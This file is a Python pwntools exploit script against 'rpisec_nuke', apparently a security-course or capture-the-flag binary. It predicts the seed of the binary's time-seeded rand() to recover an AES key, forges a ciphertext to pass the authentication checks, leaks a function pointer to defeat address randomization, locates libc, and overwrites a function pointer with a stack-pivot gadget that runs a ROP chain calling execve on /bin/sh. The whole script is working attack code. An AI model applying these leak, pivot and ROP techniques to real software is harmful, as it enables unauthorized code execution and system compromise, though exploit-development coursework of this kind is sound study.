import ctypes
import sys

from pwn import *

import mycrypto


p = process(["./rpisec_nuke"], env={"LD_PRELOAD": "./usleep.so ./libc.so.6"})
log.info(util.proc.pidof(p))

# Get session ID (e.g. buf)
p.recvuntil("LAUNCH SESSION ")
p.recv(16)
buf = p.recv(10)
buf_addr = int(buf)
log.info("Got buf address/session id {:#x}".format(buf_addr))

# Enter and then get wrong session in key3 to trigger `free`
p.sendline("3")
p.recvuntil("CONFIRM LAUNCH")
p.sendline("bogus")
p.recvuntil("INVALID")
p.sendline("")

# Now go to key 2 and enter a known input as the key
p.sendline("2")
p.recvuntil("ENTER AES-128 CRYPTO KEY:")
p.sendline("CAFEBABE"*4)
p.recvuntil("ENTER LENGTH")
p.sendline("32")
p.recvuntil("ENTER DATA")
p.sendline(" "*32)
p.recvuntil("AUTHENTICATION FAILED")
p.sendline("")

# Get the challenge, xor out our key and find the seed
def read_challenge():
    p.recvuntil("64 Bytes):")
    p.recv(38)
    challenge = []
    log.info("Reading in challenge")
    for line in range(4):
        buf=p.recv(47)
        print(buf)
        challenge.extend([chr(int(x, 16)) for x in buf.split(".")])
        p.recv(31)

    challenge = "".join(challenge)
    return challenge

p.sendline("3")
challenge = read_challenge()

p.recvuntil("TIME NOW:")
p.recv(8)
time_now = int(p.recv(10))
log.info("Got time now: {}".format(time_now))

# Find the correct seed:
libc = ctypes.cdll.LoadLibrary("libc.so.6")
# -- First dword is the result of the first rand() xored with the supplied
#    plaintext from key2 (four spaces)
first_dword = u32(challenge[0:4]) ^ 0x20202020
log.info("Trying to match challenge 0x{:08x}".format(first_dword))
for seed in range(time_now - 60 + buf_addr, time_now + buf_addr + 1):
    libc.srand(seed)
    r = libc.rand()
    # log.info("Seed {} rand 0x{:08x}".format(seed, r))
    if first_dword == r:
        log.info("Seed {} worked!".format(seed))
        break
else:
    log.info("Couldn't find matching seed :(")
    sys.exit(0)

# Now find the crowell key
enc_key = challenge[48:]
libc.srand(seed)
for i in range(12):
    r = libc.rand()
crowell_key = "".join([p32(libc.rand() ^ u32(enc_key[i*4:i*4+4])) for i in range(4)])
log.info("Leaked crowell key {}".format(crowell_key.encode("hex")))

p.recvuntil("YOUR RESPONSE")
p.sendline("bogus")
p.recvuntil("AUTHENTICATION FAILURE")
p.sendline("")

# Submit it for key2
p.sendline("2")
p.recvuntil("ENTER AES-128 CRYPTO KEY")
p.sendline(crowell_key.encode("hex"))
p.recvuntil("ENTER LENGTH")
p.sendline("32")

# Now we want to provide data that will encrypt to a value that contains key 3's check '31337' at the start
# of the second block. By putting nullbytes between we can still pass the key2 strcmp.

iv = "CFFAEDFEDEC0ADDEFECABEBA0BB0550A".decode("hex")
b1 = "KING CROWELL\x00\x00\x00\x00"
assert len(b1) == 16

ct = mycrypto.aes_encrypt_cbc(b1, crowell_key, iv)
ct += "\x37\x13\x03\x00" + "\x00" * 12
assert len(ct) == 32

pt = mycrypto.aes_decrypt_cbc(ct, crowell_key, iv)
assert pt.startswith("KING CROWELL")
ct_again = mycrypto.aes_encrypt_cbc(pt, crowell_key, iv)
assert ct_again[16:20] == "\x37\x13\x03\x00"

p.recvuntil("ENTER DATA")
p.sendline(pt)
p.recvuntil("CRYPTO KEY AUTHENTICATED")
log.info("Done key 2")
p.sendline("")

# Now solve key3
p.sendline("3")
p.recvuntil("YOUR RESPONSE:")
p.sendline("bogus")
p.recvuntil("KEY AUTHENTICATED")
log.info("Done key 3")
p.sendline("")

# Solve key 1
p.sendline("1")
p.recvuntil("INSERT LAUNCH KEY:")
p.sendline("\x00")
p.recvuntil("KEY AUTHENTICATED")
log.info("Done key 1")
p.sendline("")

# Time for Warhead
p.sendlineafter("MENU SELECTION:", "4")

def fix_program(program):
    target_checksum = 0xDCDC59A9
    # Pad
    program += "\x00" * (4 - len(program) % 4)
    # Adjust the checksum
    checksum = 0
    for i in range(0, len(program), 4):
        val = u32(program[i:i+4])
        checksum ^= val

    # Account for the "\x00END" that is added and the desired checksum
    adjust = checksum ^ target_checksum ^ u32("\x00END")
    program += p32(adjust)
    return program

def send_program(program):
    p.sendlineafter("AS HEX STRING:", program.encode("hex"))
    p.sendlineafter("PRESS ENTER", "")
    p.sendlineafter("TYPE CONFIRM", "confirm")

def send_payload(payload):
    program = fix_program(payload)
    send_program(program)

# First leak out the function pointers
payload = ""
# -- Advance to the disarm pointer
payload += "I" * 128
# -- Read out each byte
payload += "OI" * 4
# -- Reprogram
payload += "R"

send_payload(payload)

# Read out each byte
addr = ""
for i in range(4):
    p.recvuntil("0x")
    b = p.recv(2).decode("hex")
    addr += b
addr = u32(addr)

log.info("Got disarm pointer {:#x}".format(addr))

# Rebase elf
elf = ELF("./rpisec_nuke")
elf.address = addr - elf.symbols["disarm_nuke"]
log.info("Got image base {:#x}".format(elf.address))

def write_bytes_program(buf):
    program = []
    for b in buf:
        program.append("S{}I".format(b))

    return "".join(program)

LIBC_OFFSET = 0x3727632e
SYSTEM_OFFSET = 0x3ada0  # On my Ubuntu 16.04 64 bit
EXIT_OFFSET = 0x2e9d0
libc_addr = elf.address + LIBC_OFFSET
# Because I don't have a trusty VM (where libc to PIE bin offset is constant) I'm going to cheat
with open("/proc/{}/maps".format(util.proc.pidof(p)[0]), "r") as f:
    for line in f:
        if "libc" in line:
            libc_addr = int(line.split("-")[0], 16)
            break
log.info("Libc must be at {:#x}".format(libc_addr))

# Overwrite the detonate pointer with a pointer to a pivot to a ROP chain
payload = ""
key4_addr = buf_addr + 0x1320
log.info("Key4 buffer is at {:#x}".format(key4_addr))

# Gadgets
# -- From bin
mov_esp_edx = 0x2cd4  # Pivot
# -- From libc
pop_ebx = 0x000198ce  # pop ebx ; ret
pop_ecx_eax = 0x000ef750  # pop ecx ; pop eax ; ret
pop_edx = 0x00001aa2  # pop edx ; ret
binsh_addr = libc_addr + 0x160a24
syscall = 0x0002e6a5  # int 0x80

rop = ""
rop += p32(libc_addr + pop_ecx_eax)
rop += p32(0)
rop += p32(0xb)  # execve
rop += p32(libc_addr + pop_ebx)
rop += p32(binsh_addr)
rop += p32(libc_addr + pop_edx)
rop += p32(0)
rop += p32(libc_addr + syscall)

# Desired state:
# $eax   : 0x0000000b
# $ebx   : 0xffffd550  >  "/bin//sh"
# $ecx   : 0xffffd548  >  0xffffd550  >  "/bin//sh"
# $edx   : 0xffffd5a4  >  0x00

payload += write_bytes_program(rop)

# We want to overwrite the pointers
# -- Advance past the end of program, past disarm_ptr to detonate_ptr
payload += "I" * (132 - len(rop))
# -- Write the pivot gadget over the function pointer
payload += write_bytes_program(p32(elf.address + mov_esp_edx))

# Detonate
payload += "DOOM"

payload = fix_program(payload)

pause()
# Fix to pass checksum
program = fix_program(payload)
p.sendlineafter("AS HEX STRING:", program.encode("hex"))
p.interactive()
